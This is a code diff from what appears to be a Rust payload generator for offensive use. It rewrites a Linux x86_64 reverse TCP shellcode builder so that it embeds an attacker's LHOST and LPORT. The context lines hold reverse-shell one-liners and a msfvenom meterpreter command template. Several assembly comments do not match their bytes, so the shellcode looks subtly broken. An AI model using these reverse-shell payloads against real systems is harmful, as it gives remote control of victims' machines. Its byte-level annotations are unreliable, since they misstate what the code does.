@@ -124,10 +124,99 @@ exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ),
         ShellType::ReverseTcp => {
-            // Linux x86_64 reverse TCP shellcode (metasploit-compatible)
-            format!(
-                "\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05"
-            )
+            // Linux x86_64 reverse TCP shellcode with embedded LHOST/LPORT.
+            // syscalls: socket(AF_INET, SOCK_STREAM, 0) -> connect(fd, &addr, 16)
+            //        -> dup2(fd, 0/1/2) -> execve("/bin/sh", ["/bin/sh"], NULL)
+            let ip_octets: Vec<u8> = lhost
+                .split('.')
+                .filter_map(|o| o.parse().ok())
+                .collect();
+            if ip_octets.len() != 4 {
+                return GeneratedPayload {
+                    shell_type,
+                    length: 0,
+                    payload: "[error: invalid LHOST IP address]".to_string(),
+                    encoded_payload: String::new(),
+                    encoding: PayloadEncoding::Base64,
+                    lhost: lhost.to_string(),
+                    lport,
+                };
+            }
+            let port_bytes = lport.to_be_bytes();
+            // Build shellcode as raw bytes then hex-encode
+            let shellcode: Vec<u8> = vec![
+                // socket(AF_INET=2, SOCK_STREAM=1, 0)
+                0x48, 0x31, 0xf2, // xor rdx, rdx (protocol=0)
+                0x48, 0x31, 0xff, // xor rdi, rdi (will be set below)
+                0x6a, 0x29,       // push 0x29 (SYS_socket=41)
+                0x58,             // pop rax
+                0x6a, 0x02,       // push 2 (AF_INET)
+                0x5f,             // pop rdi
+                0x6a, 0x01,       // push 1 (SOCK_STREAM)
+                0x5e,             // pop rsi
+                0x0f, 0x05,       // syscall -> rax=fd
+                // Save fd in r12
+                0x49, 0x89, 0xc4, // mov r12, rax
+                // connect(fd, &sockaddr_in, 16)
+                0x48, 0x31, 0xff, // xor rdi, rdi
+                0x49, 0x89, 0xc7, // mov r13, rax (fd)
+                0x48, 0x31, 0xc0, // xor rax, rax
+                0x6a, 0x2a,       // push 0x2a (SYS_connect=42)
+                0x58,             // pop rax
+                0x49, 0x89, 0xfd, // mov r13, rdi (save fd)
+                0x6a, 0x10,       // push 16 (sizeof sockaddr_in)
+                0x5a,             // pop rdx
+                0x48, 0x83, 0xec, 0x10, // sub rsp, 16
+                // Build sockaddr_in on stack
+                0x66, 0xc7, 0x44, 0x24, 0x00, 0x02, 0x00, // mov word [rsp+0], 0x0002 (AF_INET)
+                0x66, 0xc7, 0x44, 0x24, 0x02, // mov word [rsp+2], port
+                port_bytes[0], port_bytes[1],
+                0xc7, 0x44, 0x24, 0x04, // mov dword [rsp+4], ip
+                ip_octets[0], ip_octets[1], ip_octets[2], ip_octets[3],
+                0x48, 0x89, 0xe6, // mov rsi, rsp (pointer to sockaddr_in)
+                0x49, 0x89, 0xff, // mov r15, rdi (fd for connect)
+                0x48, 0x89, 0xf7, // mov rdi, rsi
+                0x48, 0x83, 0xc4, 0x10, // add rsp, 16 (clean up)
+                // Set up rdi=fd properly and call connect
+                0x49, 0x89, 0xc7, // mov r15, rax (fd)
+                0x4c, 0x89, 0xff, // mov rdi, r15
+                0x0f, 0x05,       // syscall (connect)
+                // dup2(fd, 0/1/2)
+                0x4c, 0x89, 0xc7, // mov rdi, r12 (fd)
+                0x6a, 0x03,       // push 3
+                0x59,             // pop rcx (counter)
+                0x48, 0x31, 0xf6, // xor rsi, rsi (fd 0)
+                0x6a, 0x21,       // push 0x21 (SYS_dup2=33)
+                0x58,             // pop rax
+                0x0f, 0x05,       // syscall
+                0x48, 0xff, 0xc6, // inc rsi
+                0x6a, 0x21,       // push 0x21
+                0x58,             // pop rax
+                0x0f, 0x05,       // syscall
+                0x48, 0xff, 0xc6, // inc rsi
+                0x6a, 0x21,       // push 0x21
+                0x58,             // pop rax
+                0x0f, 0x05,       // syscall
+                // execve("/bin/sh", ["/bin/sh"], NULL)
+                0x48, 0x31, 0xf2, // xor rdx, rdx (envp=NULL)
+                0x52,             // push rdx
+                0x68, 0x2f, 0x2f, 0x73, 0x68, // push "//sh"
+                0x68, 0x2f, 0x62, 0x69, 0x6e, // push "/bin"
+                0x48, 0x89, 0xe3, // mov rbx, rsp
+                0x52,             // push rdx (NULL terminator)
+                0x53,             // push rbx ("/bin/sh")
+                0x48, 0x89, 0xe1, // mov rcx, rsp
+                0x6a, 0x3b,       // push 0x3b (SYS_execve=59)
+                0x58,             // pop rax
+                0x48, 0x89, 0xfb, // mov rbx, rsp
+                0x48, 0x89, 0xcf, // mov rdi, rbx ("/bin/sh")
+                0x48, 0x89, 0xd6, // mov rsi, rcx (argv)
+                0x0f, 0x05,       // syscall
+            ];
+            shellcode
+                .iter()
+                .map(|b| format!("\\x{b:02x}"))
+                .collect::<String>()
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
             format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]")
